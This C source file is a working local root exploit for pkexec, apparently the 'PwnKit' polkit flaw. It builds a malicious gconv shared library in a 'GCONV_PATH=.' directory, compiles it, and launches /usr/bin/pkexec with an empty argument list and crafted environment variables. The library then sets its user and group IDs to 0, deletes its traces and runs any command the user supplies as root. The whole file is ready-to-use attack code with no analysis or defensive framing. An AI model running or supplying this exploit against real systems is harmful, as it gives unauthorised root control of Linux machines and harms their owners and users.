#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <string.h>\n"
    "#include <unistd.h>\n\n"
    "void gconv() {}\n"
    "void gconv_init() {\n"
    "    setuid(0); setgid(0);\n"
    "    seteuid(0); setegid(0);\n"
    "    system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;rm -rf 'GCONV_PATH=.' 'pwnkit';\");\n"
    "    char pkcom[300];\n"
    "    strcpy(pkcom,getenv(\"pkcom\"));\n"
    "    int i=0;\n"
    "    while(pkcom[i]!='\\0')\n"
    "    {\n"
    "    if(pkcom[i]==';')\n"
    "    {\n"
    "        pkcom[i]=' ';\n"
    "    }\n"
    "    i++;\n"
    "    }\n"
    "    printf(\"execute success : \\n \");\n"
    "    system(pkcom);\n"
    "    exit(0);\n"
    "}";

int main(int argc, char *argv[]) {
    FILE *fp;
    char pkcom[300] = "pkcom=";
    system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
    system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
    fp = fopen("pwnkit/pwnkit.c", "w");
    fprintf(fp, "%s", shell);
    fclose(fp);
    system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
    char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
    if (argc > 1)
    {
        int a;
        for( a = 1; a < argc; a = a + 1)
        {
            if (a == 1)
            {
                strcat(pkcom, argv[a]);
            }
            else
            {
                char arg[300] = ";";
                strcat(arg, argv[a]);
                strcat(pkcom, arg);
            }
        }
        env[4] = pkcom;
        execve("/usr/bin/pkexec", (char*[]){NULL}, env);
    }
    else
    {
        printf("./pkcom whoami \n");
    }
}
